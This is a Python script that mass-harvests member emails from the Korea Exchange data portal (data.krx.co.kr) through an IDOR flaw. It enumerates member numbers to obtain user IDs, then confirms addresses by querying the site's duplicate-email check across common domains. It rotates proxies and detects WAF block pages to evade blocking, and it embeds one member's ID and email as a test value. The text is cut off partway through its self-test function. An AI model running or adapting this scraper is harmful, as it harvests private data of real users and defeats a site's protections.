#!/usr/bin/env python3
"""data.krx.co.kr member email dump: IDOR mbrNo -> MBR_ID -> isDupMbrEmail.

WAF/HTML/redirect is never an empty member. 407 proxies are dropped on the
first failure. Working proxies are kept. Direct IP is never used when a
panda extract URL is configured.
"""
from __future__ import annotations

import argparse
import csv
import json
import os
import random
import socket
import threading
import time
from collections import deque
from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, as_completed, wait
from typing import Any, Callable, Iterable, Iterator
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

import requests

BASE = "https://data.krx.co.kr"
IDOR = BASE + "/comm/bldAttendant/getJsonData.cmd"
DUP = BASE + "/contents/MDC/COMS/client/isDupMbrEmail.cmd"
DOMS_PRIMARY = ["naver.com", "gmail.com", "hanmail.net", "daum.net", "kakao.com", "krx.co.kr"]
DOMS_EXTRA = [
    "nate.com",
    "outlook.com",
    "hotmail.com",
    "yahoo.com",
    "yahoo.co.kr",
    "icloud.com",
    "me.com",
    "googlemail.com",
    "outlook.kr",
    "hanmail.com",
    "korea.com",
    "dreamwiz.com",
    "proton.me",
    "krx.or.kr",
]
UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)
START = int(os.environ.get("KRX_START", "2000005000"))
END = int(os.environ.get("KRX_END", "2000223000"))
WORKERS = int(os.environ.get("KRX_WORKERS", "20"))
INFLIGHT = int(os.environ.get("KRX_INFLIGHT", "0")) or max(WORKERS * 2, 8)
OUTDIR = os.environ.get("KRX_OUT", "/data/recon/data.krx.co.kr/dump")
STATIC_PROXY = (os.environ.get("HTTPS_PROXY") or os.environ.get("HTTP_PROXY") or "").rstrip("/")
PROXY_AUTH = os.environ.get("KRX_PROXY_AUTH", "").strip()
PROXY_TTL = int(os.environ.get("KRX_PROXY_TTL", "90"))
STATIC_COOLDOWN = int(os.environ.get("KRX_STATIC_COOLDOWN", "180"))
STATIC_FILE = os.environ.get("KRX_STATIC_FILE", "").strip()
EXTRACT_COUNT = int(os.environ.get("KRX_EXTRACT_COUNT", "10"))
KEEP_LIVE = int(os.environ.get("KRX_KEEP_LIVE", "16"))
PICK_N = int(os.environ.get("KRX_PICK_N", "20"))
HTTP_TIMEOUT = float(os.environ.get("KRX_HTTP_TIMEOUT", "5"))
CONNECT_TIMEOUT = float(os.environ.get("KRX_CONNECT_TIMEOUT", "3"))
UNPROVEN_CONNECT = float(os.environ.get("KRX_UNPROVEN_CONNECT", "3"))
UNPROVEN_READ = float(os.environ.get("KRX_UNPROVEN_READ", "5"))
SESS_CACHE = int(os.environ.get("KRX_SESS_CACHE", "32"))
MAX_PER_PROXY = int(os.environ.get("KRX_MAX_PER_PROXY", "2"))
BAD_CAP = int(os.environ.get("KRX_BAD_CAP", "3000"))
USE_DIRECT = os.environ.get("KRX_USE_DIRECT", "1") != "0"
DIRECT = "__direct__"
DIRECT_COOLDOWN = int(os.environ.get("KRX_DIRECT_COOLDOWN", "180"))
DIRECT_WHEN_GOOD_LT = int(os.environ.get("KRX_DIRECT_WHEN_GOOD_LT", "3"))
STATIC_STRIKES = int(os.environ.get("KRX_STATIC_STRIKES", "3"))
PANDA_STRIKES = int(os.environ.get("KRX_PANDA_STRIKES", "3"))
STATIC_REPROBE = int(os.environ.get("KRX_STATIC_REPROBE", "60"))
PANDA_PROBE = os.environ.get("KRX_PANDA_PROBE", "0") != "0"
TOPUP_HUNGRY = float(os.environ.get("KRX_TOPUP_HUNGRY", "4"))
TOPUP_IDLE = float(os.environ.get("KRX_TOPUP_IDLE", "6"))
TRIAL_SLOTS = int(os.environ.get("KRX_TRIAL_SLOTS", "4"))
EXTRACT_DEAD_HINTS = ("用完", "不足", "余额", "过期", "失效", "次数已", "提取失败", "订单不存在", "INVALID")
CLOUD_GOOD_FROM = 2000005966
KNOWN_MBR = 2000008331
KNOWN_ID = "ryujt"
EMPTY_MBR = 1999999999

_tls = threading.local()
_lock = threading.Lock()
_stats = {"done": 0, "ids": 0, "emails": 0, "err": 0, "retry": 0, "t0": time.time()}
_recent: deque[float] = deque()
POOL: "ProxyPool | None" = None


def is_warm_proxy(proxy: str | None) -> bool:
    if not proxy or proxy == DIRECT:
        return False
    pool = POOL
    if pool is None:
        return False
    if proxy in pool.static_set:
        return True
    return proxy in pool.proven


def http_timeout(proxy: str | None = None) -> tuple[float, float]:
    if proxy is None:
        return (CONNECT_TIMEOUT, HTTP_TIMEOUT)
    if is_warm_proxy(proxy):
        return (CONNECT_TIMEOUT, HTTP_TIMEOUT)
    return (UNPROVEN_CONNECT, UNPROVEN_READ)


def window_rate(now: float | None = None, seconds: float = 30.0) -> float:
    """Completions per second over the last `seconds` (not lifetime average)."""
    t = now if now is not None else time.time()
    while _recent and t - _recent[0] > seconds:
        _recent.popleft()
    if len(_recent) < 2:
        return 0.0
    span = t - _recent[0]
    if span <= 0:
        return 0.0
    return (len(_recent) - 1) / span


def iter_inflight(ex: ThreadPoolExecutor, items: Iterable[Any], submit: Callable, window: int) -> Iterator:
    """Yield finished futures as they complete, keeping `window` jobs in flight."""
    it = iter(items)
    inflight: set = set()
    exhausted = False
    win = max(int(window), 1)
    while True:
        while not exhausted and len(inflight) < win:
            try:
                item = next(it)
            except StopIteration:
                exhausted = True
                break
            inflight.add(submit(ex, item))
        if not inflight:
            return
        done, inflight = wait(inflight, return_when=FIRST_COMPLETED)
        for fut in done:
            yield fut


def with_extract_count(url: str, n: int) -> str:
    p = urlparse(url)
    q = dict(parse_qsl(p.query, keep_blank_values=True))
    q["count"] = str(n)
    return urlunparse((p.scheme, p.netloc, p.path, p.params, urlencode(q), p.fragment))


def extract_is_dead(text: str) -> bool:
    t = text or ""
    if not t:
        return False
    return any(h in t for h in EXTRACT_DEAD_HINTS)


def panda_urls() -> list[str]:
    urls: list[str] = []
    u = os.environ.get("KRX_PANDA_URL", "").strip()
    if u:
        urls.append(u)
    for i in range(2, 9):
        u = os.environ.get(f"KRX_PANDA_URL_{i}", "").strip()
        if u:
            urls.append(u)
    for part in os.environ.get("KRX_PANDA_URLS", "").split("|"):
        part = part.strip()
        if part:
            urls.append(part)
    # de-dupe preserve order
    out: list[str] = []
    for u in urls:
        if u not in out:
            out.append(u)
    return out


def inject_auth(proxy: str, extra_auth: str = "") -> str:
    auth = extra_auth or PROXY_AUTH
    if not auth:
        return proxy
    p = urlparse(proxy)
    host = p.hostname or ""
    port = f":{p.port}" if p.port else ""
    if p.username:
        return proxy
    return urlunparse((p.scheme or "http", f"{auth}@{host}{port}", p.path, "", p.query, ""))


def parse_proxy_line(line: str, extra_auth: str = "") -> str | None:
    line = (line or "").replace("\r", "").strip()
    if not line or line.startswith("{") or line.startswith("<"):
        return None
    low = line.lower()
    if "code" in low and ("invalid" in low or "请按规定" in line or "error" in low):
        return None
    if "://" in line:
        return inject_auth(line, extra_auth)
    if "/" in line:
        sp = line.split("/")
        if len(sp) >= 4 and sp[1].isdigit():
            host, port, user, pwd = sp[0], sp[1], sp[2], "/".join(sp[3:])
            return f"socks5h://{user}:{pwd}@{host}:{port}"
    if "@" in line and line.count(":") >= 2:
        return inject_auth("http://" + line, extra_auth)
    parts = line.split(":")
    if len(parts) == 2:
        ip, port = parts
        if not port.isdigit():
            return None
        return inject_auth(f"http://{ip}:{port}", extra_auth)
    if len(parts) >= 4:
        ip, port, user, pwd = parts[0], parts[1], parts[2], ":".join(parts[3:])
        if not port.isdigit():
            return None
        return f"http://{user}:{pwd}@{ip}:{port}"
    return None


def static_proxy_list() -> list[str]:
    raw: list[str] = []
    blob = os.environ.get("KRX_STATIC_PROXIES", "").strip()
    if blob:
        for part in blob.replace(",", "|").split("|"):
            part = part.strip()
            if part:
                raw.append(part)
    for i in range(1, 20):
        key = "KRX_STATIC_PROXY" if i == 1 else f"KRX_STATIC_PROXY_{i}"
        v = os.environ.get(key, "").strip()
        if v:
            raw.append(v)
    if STATIC_PROXY:
        raw.append(STATIC_PROXY)
    path = STATIC_FILE
    if not path:
        path = os.path.join(os.path.dirname(OUTDIR.rstrip("/")), "static_proxies.txt")
    if os.path.exists(path):
        with open(path, encoding="utf-8") as f:
            for line in f:
                line = line.replace("\r", "").strip()
                if line and not line.startswith("#"):
                    raw.append(line)
    out: list[str] = []
    for line in raw:
        p = parse_proxy_line(line)
        if p and p not in out:
            out.append(p)
    return out


def parse_extract_body(text: str, extra_auth: str = "") -> list[str]:
    text = (text or "").strip()
    if not text:
        return []
    if text.startswith("{"):
        try:
            j = json.loads(text)
        except Exception:
            return []
        items = j.get("obj") or j.get("data") or []
        out: list[str] = []
        if isinstance(items, list):
            for item in items:
                if not isinstance(item, dict):
                    continue
                ip = str(item.get("ip") or "").strip()
                port = str(item.get("port") or "").strip()
                if not ip or not port:
                    continue
                user = str(
                    item.get("account")
                    or item.get("user")
                    or item.get("username")
                    or item.get("acc")
                    or ""
                ).strip()
                pwd = str(item.get("password") or item.get("pwd") or item.get("pass") or "").strip()
                if user and pwd:
                    out.append(f"http://{user}:{pwd}@{ip}:{port}")
                else:
                    p = parse_proxy_line(f"{ip}:{port}", extra_auth)
                    if p:
                        out.append(p)
        return out
    got: list[str] = []
    for line in text.splitlines():
        p = parse_proxy_line(line, extra_auth)
        if p:
            got.append(p)
    return got


def is_waf_text(status: int, text: str) -> bool:
    if status != 200:
        return True
    head = (text or "")[:800]
    if head.lstrip().startswith("<"):
        return True
    return any(
        s in head
        for s in (
            "에러페이지",
            "Access Denied",
            "document has been moved",
            "ERROR: The request could not be satisfied",
        )
    )


def is_proxy_auth_fail(exc: BaseException | None = None, text: str = "") -> bool:
    blob = f"{exc} {text}".lower()
    if "<html" in blob or "에러페이지" in blob or "access denied" in blob:
        return False
    return "407" in blob or "white list" in blob or "whitelist" in blob


def json_from_response(resp: requests.Response) -> dict[str, Any] | None:
    if is_waf_text(resp.status_code, resp.text):
        return None
    try:
        data = resp.json()
    except Exception:
        return None
    return data if isinstance(data, dict) else None


class ProxyPool:
    def __init__(self, urls: list[str] | None = None, static: str = "", extra_auth: str = "") -> None:
        self.urls = urls if urls is not None else panda_urls()
        self.static = static.rstrip("/") if static else STATIC_PROXY
        self.extra_auth = extra_auth or PROXY_AUTH
        self.proxies: list[str] = []
        self.good: list[str] = []
        self.bad: set[str] = set()
        self.strikes: dict[str, int] = {}
        self.born: dict[str, float] = {}
        self.dead_urls: set[str] = set()
        self.empty_streak: dict[str, int] = {}
        self.last_fetch = 0.0
        self.ui = 0
        self.i = 0
        self._fetch_lock = threading.Lock()
        self.use_direct = USE_DIRECT
        self.direct_until = 0.0
        self.allow_direct = self.use_direct or not self.urls
        self.static_list: list[str] = []
        self.static_set: set[str] = set()
        self.static_until: dict[str, float] = {}
        self.static_tried: dict[str, float] = {}
        self.static_down: set[str] = set()
        self.in_flight: dict[str, int] = {}
        self.hold_t: dict[str, float] = {}
        self.proven: set[str] = set()
        self.live_sess: dict[str, list] = {}
        if static:
            p = static.rstrip("/")
            if p:
                self.static_tried[p] = 0.0

    def _alive_urls(self) -> list[str]:
        return [u for u in self.urls if u not in self.dead_urls]

    def _fresh(self, proxy: str) -> bool:
        if proxy in self.bad:
            return False
        if proxy in self.static_set:
            if proxy in self.static_down:
                return False
            return time.time() >= self.static_until.get(proxy, 0)
        return (time.time() - self.born.get(proxy, 0)) < PROXY_TTL

    def panda_proven_n(self) -> int:
        now = time.time()
        n = 0
        for p in self.proven:
            if p in self.static_set or p in self.bad:
                continue
            if (now - self.born.get(p, 0)) < PROXY_TTL:
                n += 1
        return n

    def panda_good_n(self) -> int:
        now = time.time()
        n = 0
        for p in self.good:
            if p in self.static_set or p in self.bad:
                continue
            if (now - self.born.get(p, 0)) < PROXY_TTL:
                n += 1
        return n

    def static_live(self) -> list[str]:
        now = time.time()
        return [
            p
            for p in self.static_list
            if p not in self.bad and p not in self.static_down and now >= self.static_until.get(p, 0)
        ]

    def live_list(self) -> list[str]:
        return [p for p in self.proxies if self._fresh(p)]

    def live_n(self) -> int:
        return len(self.live_list())

    def good_n(self) -> int:
        return len([p for p in self.good if self._fresh(p)])

    def _probe(self, proxy: str) -> bool:
        s = requests.Session()
        s.trust_env = False
        s.proxies = {"http": proxy, "https": proxy}
        s.headers.update({"User-Agent": UA, "X-Requested-With": "XMLHttpRequest"})
        try:
            r = s.post(
                IDOR,
                data={"bld": "dbms/MDC/DATA/mbr_add_info_select", "locale": "ko_KR", "mbrNo": str(KNOWN_MBR)},
                headers={"Referer": BASE + "/contents/MDC/MAIN/main/index.cmd"},
                timeout=http_timeout(),
            )
            if is_proxy_auth_fail(text=r.text) or r.status_code == 407:
                return False
            body = json_from_response(r)
            return bool(body and "block1" in body)
        except Exception as e:
            return not is_proxy_auth_fail(e) and False

    def _expire_old(self) -> None:
        """Drop expired IPs from born/good/proxies so pick() stays O(live). Caller holds _lock."""
        now = time.time()
        dead = [p for p, t0 in self.born.items() if p not in self.static_set and now - t0 >= PROXY_TTL]
        if not dead:
            return
        dead_set = set(dead)
        for p in dead:
            self.born.pop(p, None)
            self.strikes.pop(p, None)
            self.proven.discard(p)
        self.good = [p for p in self.good if p not in dead_set]
        self.proxies = [p for p in self.proxies if p not in dead_set]

    def prune(self) -> None:
        with _lock:
            self._expire_old()
            if len(self.bad) > BAD_CAP:
                self.bad.clear()

    def _next_url(self) -> str | None:
        alive = self._alive_urls()
        if not alive:
            return None
        url = alive[self.ui % len(alive)]
        self.ui += 1
        return url

    def fetch(self) -> None:
        if not self.urls:
            return
        if not self._fetch_lock.acquire(blocking=False):
            time.sleep(0.2)
            return
        try:
            if self.panda_proven_n() >= KEEP_LIVE:
                return
            url = self._next_url()
            if url is None:
                print("api_exhausted all extract URLs used up", flush=True)
                time.sleep(2)
                return
            wait = 1.05 - (time.time() - self.last_fetch)
            if wait > 0:
                time.sleep(wait)
            get_url = with_extract_count(url, EXTRACT_COUNT) if EXTRACT_COUNT > 0 else url
            try:
                r = requests.get(get_url, timeout=15)
                self.last_fetch = time.time()
                text = r.text
            except Exception as e:
                self.last_fetch = time.time()
                print(f"extract_err {type(e).__name__}", flush=True)
                return
            if extract_is_dead(text):
                self.dead_urls.add(url)
                print(f"api_dead {url.split('orderNo=')[-1][:28]} {text[:80].replace(chr(10),' ')}", flush=True)
                return
            got = parse_extract_body(text, self.extra_auth)
            if not got:
                n = self.empty_streak.get(url, 0) + 1
                self.empty_streak[url] = n
                if n >= 3:
                    self.dead_urls.add(url)
                    print(f"api_dead_empty {url.split('orderNo=')[-1][:28]}", flush=True)
                return
            self.empty_streak[url] = 0
            ok_list = got
            if PANDA_PROBE:
                ok_list = []
                with ThreadPoolExecutor(max_workers=min(8, len(got))) as ex:
                    futs = {ex.submit(self._probe, p): p for p in got}
                    for fut in as_completed(futs):
                        p = futs[fut]
                        try:
                            if fut.result():
                                ok_list.append(p)
                        except Exception:
                            pass
            now = time.time()
            with _lock:
                for p in got:
                    if p not in ok_list:
                        self.bad.add(p)
                        if p in self.good:
                            self.good.remove(p)
                        continue
                    if p not in self.proxies:
                        self.proxies.append(p)
                    self.bad.discard(p)
                    self.strikes.pop(p, None)
                    self.born[p] = now
                    if p not in self.good:
                        self.good.append(p)
                self._expire_old()
                if len(self.bad) > BAD_CAP:
                    self.bad.clear()
            print(
                f"proxy_pool +{len(got)} usable={len(ok_list)} good={self.good_n()} "
                f"born={len(self.born)} apis={len(self._alive_urls())}/{len(self.urls)}",
                flush=True,
            )
        finally:
            self._fetch_lock.release()

    def fetch_all(self) -> None:
        for _ in list(self._alive_urls()):
            self.fetch()

    def load_static(self) -> None:
        self.sync_static()

    def sync_static(self) -> None:
        wanted = static_proxy_list()
        wanted_set = set(wanted)
        with _lock:
            dropped = [p for p in list(self.static_list) if p not in wanted_set]
            for p in dropped:
                if p in self.static_list:
                    self.static_list.remove(p)
                self.static_set.discard(p)
                self.static_down.discard(p)
                if p in self.good:
                    self.good.remove(p)
                print(f"static_drop {urlparse(p).hostname}", flush=True)
        now = time.time()
        to_probe: list[str] = []
        for p in wanted:
            down = p in self.static_down
            if p in self.static_set and not down:
                continue
            if down and now < self.static_until.get(p, 0):
                continue
            self.bad.discard(p)
            last = self.static_tried.get(p)
            if last is not None and now - last < STATIC_REPROBE:
                continue
            to_probe.append(p)
        if not to_probe:
            return
        for p in to_probe:
            self.static_tried[p] = now
        ok_list: list[str] = []
        with ThreadPoolExecutor(max_workers=min(8, len(to_probe))) as ex:
            futs = {ex.submit(self._probe, p): p for p in to_probe}
            for fut in as_completed(futs):
                p = futs[fut]
                try:
                    if fut.result():
                        ok_list.append(p)
                except Exception:
                    pass
        now = time.time()
        with _lock:
            for p in to_probe:
                label = urlparse(p).hostname or urlparse(p).username or p[-18:]
                if p not in ok_list:
                    print(f"static_fail {label}", flush=True)
                    continue
                self.static_set.add(p)
                if p not in self.static_list:
                    self.static_list.append(p)
                if p not in self.proxies:
                    self.proxies.append(p)
                self.bad.discard(p)
                self.static_until.pop(p, None)
                self.static_down.discard(p)
                self.strikes.pop(p, None)
                self.born[p] = now
                if p not in self.good:
                    self.good.append(p)
                self.proven.add(p)
                print(f"static_ok {label}", flush=True)
        print(f"static_ready {len(self.static_list)} live file/env probed={len(ok_list)}/{len(to_probe)}", flush=True)

    def _note_hold(self, proxy: str) -> None:
        if proxy not in self.hold_t:
            self.hold_t[proxy] = time.time()

    def _hung_limit(self, proxy: str) -> float:
        if proxy == DIRECT or proxy in self.static_set or proxy in self.proven:
            return CONNECT_TIMEOUT + HTTP_TIMEOUT + 2.0
        return UNPROVEN_CONNECT + UNPROVEN_READ + 2.0

    def _reap_hung(self) -> list:
        now = time.time()
        to_close: list = []
        hung = [
            p
            for p, n in self.in_flight.items()
            if n > 0 and now - self.hold_t.get(p, 0) >= self._hung_limit(p)
        ]
        for p in hung:
            self.in_flight.pop(p, None)
            self.hold_t.pop(p, None)
            self.proven.discard(p)
            if p != DIRECT and p not in self.static_set:
                self.bad.add(p)
                if p in self.good:
                    self.good.remove(p)
            print(f"hung_drop {urlparse(p).hostname or urlparse(p).username or p[-18:]}", flush=True)
            to_close.extend(self.live_sess.pop(p, []))
        return to_close

    def _close_sessions(self, sessions: list) -> None:
        for s in sessions:
            try:
                s.close()
            except Exception:
                pass

    def bind_session(self, proxy: str, session: requests.Session) -> None:
        with _lock:
            self.live_sess.setdefault(proxy, []).append(session)

    def unbind_session(self, proxy: str, session: requests.Session) -> None:
        with _lock:
            lst = self.live_sess.get(proxy)
            if not lst:
                return
            try:
                lst.remove(session)
            except ValueError:
                pass
            if not lst:
                self.live_sess.pop(proxy, None)

    def reap_now(self) -> None:
        with _lock:
            sessions = self._reap_hung()
        self._close_sessions(sessions)

    def _cap(self, proxy: str) -> int:
        return 1 if proxy == DIRECT else MAX_PER_PROXY

    def try_acquire(self, proxy: str) -> bool:
        now = time.time()
        with _lock:
            sessions = self._reap_hung()
            ok = True
            if proxy in self.bad or proxy in self.static_down:
                ok = False
            elif proxy in self.static_set and now < self.static_until.get(proxy, 0):
                ok = False
            else:
                n = self.in_flight.get(proxy, 0)
                if n >= self._cap(proxy):
                    ok = False
                else:
                    self.in_flight[proxy] = n + 1
                    self._note_hold(proxy)
        self._close_sessions(sessions)
        return ok

    def release(self, proxy: str | None) -> None:
        if not proxy:
            return
        with _lock:
            n = self.in_flight.get(proxy, 0) - 1
            if n <= 0:
                self.in_flight.pop(proxy, None)
                self.hold_t.pop(proxy, None)
            else:
                self.in_flight[proxy] = n

    def pick(self) -> str | None:
        now = time.time()
        with _lock:
            sessions = self._reap_hung()
            static_live = [
                p
                for p in self.static_list
                if p not in self.bad
                and p not in self.static_down
                and now >= self.static_until.get(p, 0)
            ]
            panda = [
                p
                for p in self.good
                if p not in self.static_set
                and p not in self.bad
                and (now - self.born.get(p, 0)) < PROXY_TTL
            ]
            panda.sort(key=lambda p: (0 if p in self.proven else 1, self.born.get(p, 0)))
            if PICK_N > 0:
                panda = panda[:PICK_N]
            live = panda + static_live
            if self.use_direct and now >= self.direct_until and not panda:
                live = live + [DIRECT]
            live.sort(key=lambda p: (self.in_flight.get(p, 0), 0 if p in self.proven or p in self.static_set else 1))
            chosen = None
            for p in live:
                n = self.in_flight.get(p, 0)
                if n < self._cap(p):
                    self.in_flight[p] = n + 1
                    self._note_hold(p)
                    chosen = p
                    break
            empty = not live and chosen is None
        self._close_sessions(sessions)
        if chosen:
            return chosen
        if empty and self.use_direct and now >= self.direct_until:
            if self.try_acquire(DIRECT):
                return DIRECT
        return None

    def ok(self, proxy: str | None) -> None:
        if not proxy:
            return
        if proxy == DIRECT:
            with _lock:
                self.direct_until = 0.0
            return
        with _lock:
            if not self._fresh(proxy):
                return
            self.strikes.pop(proxy, None)
            self.bad.discard(proxy)
            self.static_until.pop(proxy, None)
            self.static_down.discard(proxy)
            if proxy not in self.good:
                self.good.append(proxy)
            self.proven.add(proxy)

    def fail(self, proxy: str | None, auth: bool = False) -> None:
        if not proxy:
            return
        if proxy == DIRECT:
            with _lock:
                _stats["retry"] += 1
                now = time.time()
                first = now >= self.direct_until
                self.direct_until = now + DIRECT_COOLDOWN
            if first:
                print(f"direct_cooldown {DIRECT_COOLDOWN}s", flush=True)
            return
        if proxy in self.static_set:
            with _lock:
                _stats["retry"] += 1
                now = time.time()
                n = self.strikes.get(proxy, 0) + 1
                self.strikes[proxy] = n
                cool = auth or n >= STATIC_STRIKES
                first = False
                if cool:
                    first = proxy not in self.static_down
                    self.static_until[proxy] = now + STATIC_COOLDOWN
                    self.static_down.add(proxy)
                    if proxy in self.good:
                        self.good.remove(proxy)
                    self.proven.discard(proxy)
            if first:
                kind = "auth" if auth else "waf"
                print(
                    f"static_cooldown {urlparse(proxy).hostname or urlparse(proxy).username} "
                    f"{kind} {STATIC_COOLDOWN}s strikes={n}",
                    flush=True,
                )
            return
        with _lock:
            _stats["retry"] += 1
            self.proven.discard(proxy)
            if auth:
                self.strikes[proxy] = 99
                self.bad.add(proxy)
                if proxy in self.good:
                    self.good.remove(proxy)
            else:
                n = self.strikes.get(proxy, 0) + 1
                self.strikes[proxy] = n
                if n >= PANDA_STRIKES:
                    self.bad.add(proxy)
                    if proxy in self.good:
                        self.good.remove(proxy)
        # Do not fetch here. Scanning threads must not block on extract/probe.


def session_for(proxy: str | None, keep_alive: bool | None = None) -> requests.Session:
    if keep_alive is None:
        keep_alive = is_warm_proxy(proxy)
    cache: dict = getattr(_tls, "cache", None) or {}
    _tls.cache = cache
    key = (proxy or "direct", keep_alive)
    s = cache.get(key)
    if s is None:
        s = requests.Session()
        s.trust_env = False
        headers = {"User-Agent": UA, "X-Requested-With": "XMLHttpRequest"}
        if keep_alive:
            headers["Connection"] = "keep-alive"
            pool_n = 8
        else:
            headers["Connection"] = "close"
            pool_n = 4
        s.headers.update(headers)
        s.mount(
            "https://",
            requests.adapters.HTTPAdapter(pool_connections=pool_n, pool_maxsize=pool_n, max_retries=0),
        )
        if proxy and proxy != DIRECT:
            s.proxies.update({"http": proxy, "https": proxy})
        cache[key] = s
        if len(cache) > SESS_CACHE:
            old = next(iter(cache))
            if old != key:
                cache.pop(old, None)
    return s


def drop_session(proxy: str | None, unstick: bool = False) -> None:
    cache = getattr(_tls, "cache", None)
    if cache:
        base = proxy or "direct"
        cache.pop((base, True), None)
        cache.pop((base, False), None)
        cache.pop(base, None)
    if unstick and getattr(_tls, "proxy", None) == proxy:
        _tls.proxy = None


def post_ok(url: str, data: dict[str, str], need: str) -> dict[str, Any]:
    pool = POOL
    if pool is None:
        raise RuntimeError("proxy pool not initialized")
    fails = 0
    proxy = getattr(_tls, "proxy", None)
    while True:
        if proxy is not None and not pool.try_acquire(proxy):
            _tls.proxy = None
            proxy = None
        if proxy is None:
            proxy = pool.pick()
            if proxy is None:
                time.sleep(0.04)
                continue
            _tls.proxy = proxy
        held = proxy
        warm_before = is_warm_proxy(held)
        s = session_for(held, keep_alive=warm_before)
        pool.bind_session(held, s)
        try:
            r = s.post(
                url,
                data=data,
                headers={"Referer": BASE + "/contents/MDC/MAIN/main/index.cmd"},
                timeout=http_timeout(held),
            )
            if r.status_code == 407 or is_proxy_auth_fail(text=r.text):
                drop_session(held, unstick=True)
                pool.fail(held, auth=True)
                proxy = None
                fails += 1
                continue
            body = json_from_response(r)
            if body is not None and need in body:
                pool.ok(held)
                if not warm_before and is_warm_proxy(held):
                    drop_session(held)
                return body
            drop_session(held, unstick=True)
            pool.fail(held)
            proxy = None
            fails += 1
        except Exception as e:
            drop_session(held, unstick=True)
            pool.fail(held, auth=is_proxy_auth_fail(e))
            proxy = None
            fails += 1
            if fails % 20 == 0:
                print(f"stall fails={fails} inflight={sum(pool.in_flight.values())} panda={pool.panda_good_n()} proven={len(pool.proven)}", flush=True)
            if fails % 4 == 0:
                time.sleep(0.05)
        finally:
            pool.unbind_session(held, s)
            pool.release(held)


def mbr_id(mno: int) -> str | None:
    body = post_ok(
        IDOR,
        {"bld": "dbms/MDC/DATA/mbr_add_info_select", "locale": "ko_KR", "mbrNo": str(mno)},
        "block1",
    )
    block = body.get("block1") or []
    if not block:
        return None
    return block[0].get("MBR_ID")


def dup_email(mid: str, domains: list[str]) -> str | None:
    for d in domains:
        em = f"{mid}@{d}"
        body = post_ok(DUP, {"email": em}, "isDupMbrEmail")
        val = body.get("isDupMbrEmail")
        if val is True or str(val).lower() == "true":
            return em
    return None


def one_idor(mno: int) -> tuple[int, str | None, str | None]:
    while True:
        try:
            mid = mbr_id(mno)
            if not mid:
                return mno, None, None
            return mno, mid, dup_email(mid, DOMS_PRIMARY)
        except Exception:
            with _lock:
                _stats["err"] += 1
            time.sleep(1.5)


def one_mail(mno: int, mid: str) -> tuple[int, str | None, str | None]:
    while True:
        try:
            return mno, mid, dup_email(mid, DOMS_EXTRA)
        except Exception:
            with _lock:
                _stats["err"] += 1
            time.sleep(1.5)


def load_csv_map(path: str) -> dict[int, str]:
    out: dict[int, str] = {}
    if not os.path.exists(path):
        return out
    with open(path, newline="", encoding="utf-8") as f:
        for row in csv.reader(f):
            if not row or row[0] in {"mbrNo", "mno"}:
                continue
            try:
                out[int(row[0])] = row[1] if len(row) > 1 else ""
            except ValueError:
                continue
    return out


def load_scanned_status(path: str) -> dict[int, str]:
    out: dict[int, str] = {}
    if not os.path.exists(path):
        return out
    with open(path, newline="", encoding="utf-8") as f:
        for row in csv.reader(f):
            if not row or row[0] in {"mbrNo"}:
                continue
            try:
                out[int(row[0])] = row[1] if len(row) > 1 else ""
            except ValueError:
                continue
    return out


def build_jobs(
    start: int,
    end: int,
    have_id: dict[int, str],
    have_email: dict[int, str],
    scanned: dict[int, str],
    cloud_good_from: int = CLOUD_GOOD_FROM,
) -> tuple[list[tuple[int, str]], list[int], list[int], list[int]]:
    confirmed_empty = {n for n, st in scanned.items() if st == "empty"}
    nomail = {n for n, st in scanned.items() if st == "nomail"}
    seen_skip = set(have_id) | confirmed_empty
    last_id = max(have_id) if have_id else start
    head = [n for n in range(start, min(end, cloud_good_from - 1) + 1) if n not in seen_skip]
    tail_from = max(start, last_id + 1)
    tail = [n for n in range(tail_from, end + 1) if n not in seen_skip]
    holes = [
        n
        for n in range(max(start, cloud_good_from), min(end, last_id) + 1)
        if n not in seen_skip
    ]
    mail_jobs = [
        (n, mid)
        for n, mid in have_id.items()
        if n not in have_email and n not in nomail and mid
    ]
    return mail_jobs, head, tail, holes


def init_pool(urls: list[str] | None = None) -> ProxyPool:
    global POOL
    POOL = ProxyPool(urls=urls)
    return POOL


def selftest() -> int:
    """Live checks against panda + KRX. Return 0 if safe to dump."""
    urls = panda_urls()
    print("selftest urls", len(urls), flush=True)
    if not urls:
        print("FAIL no panda urls", flush=True)
        return 1
    pool = init_pool(urls)
    pool.fetch_all()
    if pool.live_n() < 1:
        print("FAIL extract empty", flush=True)
        return 1
    parsed = parse_extract_body("1.2.3.4:80\r\n5.6.7.8:90\r\n")
    if parsed != ["http://1.2.3.4:80", "http://5.6.7.8:90"]:
        print("FAIL crlf parse", parsed, flush=True)
        return 1

    last_hit = None
    functional_ok = False
    for proxy in list(pool.proxies):
        s = requests.Session()
        s.trust_env = False
        s.proxies = {"http": proxy, "https": proxy}
        s.headers.update({"User-Agent": UA, "X-Requested-With": "XMLHttpRequest"})

        def post_now(mno: int):
            r = s.post(
                IDOR,
                data={"bld": "dbms/MDC/DATA/mbr_add_info_select", "locale": "ko_KR", "mbrNo": str(mno)},
                headers={"Referer": BASE + "/contents/MDC/MAIN/main/index.cmd"},
                timeout=16,
            )
            body = json_from_response(r)
            if body is None or "block1" not in body:
                raise RuntimeError(f"bad json {r.status_code} {r.text[:120]}")
            block = body.get("block1") or []
            return None if not block else block[0].get("MBR_ID")

        try:
            mid = post_now(KNOWN_MBR)
        except Exception as e:
            pool.fail(proxy, auth=is_proxy_auth_fail(e))
            print("probe_exc", proxy, type(e).__name__, str(e)[:100], flush=True)
            continue
        if mid != KNOWN_ID:
            pool.fail(proxy, auth=True)
            print("probe_bad", proxy, mid, flush=True)
            continue
        pool.ok(proxy)
        print("probe_ok", proxy, flush=True)
        try:
            empty = post_now(EMPTY_MBR)
            if empty is not None:
                print("FAIL empty mbr should be None", empty, flush=True)
                return 1
            for n in (2000222668, 2000222700, 2000222800, 2000223000, 2000224000):
                midn = post_now(n)
                print("tail", n, midn, flush=True)
                if midn:
                    last_hit = (n, midn)
            r_true = s.post(
                DUP,
                data={"email": "ryujt@naver.com"},
                headers={"Referer": BASE + "/contents/MDC/MAIN/main/index.cmd"},
                timeout=16,
            )
            r_false = s.post(
                DUP,
                data={"email": "zzznomatchkrx999@naver.com"},
                headers={"Referer": BASE + "/contents/MDC/MAIN/main/index.cmd"},
                timeout=16,
            )
